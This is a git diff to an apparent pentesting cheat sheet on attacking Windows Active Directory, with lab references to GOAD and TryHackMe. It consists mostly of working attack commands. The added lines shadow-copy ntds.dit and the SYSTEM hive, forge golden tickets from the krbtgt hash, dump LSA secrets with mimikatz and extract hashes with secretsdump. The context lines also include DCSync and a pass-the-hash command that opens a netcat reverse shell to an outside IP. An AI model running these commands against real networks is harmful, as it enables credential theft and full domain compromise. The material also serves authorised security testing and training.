@@ -102,7 +102,11 @@ https://github.com/Orange-Cyberdefense/GOAD
 
 ---
 # Memo
-![png](https://imgur.com/JSxaYVX.png)  
+![png](https://i.imgur.com/JSxaYVX.png)
+
+---
+# Online Cheatsheet
+- [GTFOBins](https://gtfobins.github.io/)
 
 ---
 
@@ -408,6 +412,9 @@ PS> get-module
 # check user
 PS> whoami /user
 PS> whoami /priv
+PS> Get-LocalUser
+# Group
+PS> Get-LocalGroup
 # check loggedon
 PS> qwinsta
 # check OS
@@ -698,6 +705,13 @@ PS> setspn.exe -Q */*
 PS> setspn.exe -Q vmware/HOGE.clocal
 PS> setspn.exe -T HOGE.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
 ```
+## vsshadow.exe
+```powershell
+PS> vshadow.exe -nw -p C:
+PS> copy \\?\GLOBALROOT\Device\HarddiskShadowVolumeCopy1\windows\ntds\ntds.dit c:\ntds.dit.bak
+PS> reg.exe save hklm\system c:\system.bak
+```
+
 
 # PowerView  
 https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
@@ -916,11 +930,13 @@ PS> mimikatz.exe
 mimikatz# privilege::debug
 mimikatz# base64 /out:true
 mimikatz# kerberos::list /export
+mimikatz# kerberos::purge
 ## linux
 # $ echo "<base64 TestUser>" |  tr -d \\n
 # $ cat encoded_file | base64 -d > TestUser.kirbi
 mimikatz# kerberos::ptt Target.kirbi
 mimikatz# kerberos::golden /sid:TargetSid /domain:hoge.com /target: TestWeb.corp.com /service:http /rc4:TargetRc4 /ptt /user:TestUser
+mimikatz# kerberos::golden /user:TestUser /domain:hoge.com /sid:TargetSid /krbtgt:KrbtgtNtlmHash /ptt
 mimikatz# tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
 mimikatz# tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
 mimikatz# tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
@@ -930,10 +946,12 @@ mimikatz# sekurlsa::tickets /export
 mimikatz# sekurlsa::pth /user:TestUser /domain:hoge.com /rc4:TestRc4Hash /run:"c:\tools\nc64.exe -e cmd.exe XXX.XXX.XXX.XXX 5556"
 mimikatz# sekurlsa::pth /user:TestUser /domain:hoge.com /ntlm:TestNtlmHash /run:powershell
 mimikatz# lsadump::lsa /inject /name:TestUser
+mimikarz# lsadump::lsa /patch
 mimikatz# lsadump::dcsync /user:hoge\TestUser
 mimikatz# lsadump::dcsync /user:hoge\krbtgt
 mimikatz# lsadump::dcsync /domain:HOGE.COM /user:HOGE\administrator
 mimikatz# misc::skelton
+mimikatz# misc::cmd
 ```
 
 # Rebeus
@@ -1063,6 +1081,7 @@ $ secretsdump.py -outputfile hoge-com_hashes -just-dc HOGE.com/TestUser@XXX.XXX.
 $ secretsdump.py -just-dc-user HOGE/administrator "Test-DC1$"@XXX.XXX.XXX.XXX -hashes TestNtHash:TestLmHash
 $ secretsdump.py -sam sam.hive -system system.hive LOCAL
 $ ls hoge-com_hashes*
+$ secretsdump.py -ntds CopiedNtds.dit -system system.hive LOCAL
 ```
 ## psexec.py
 tag: shell
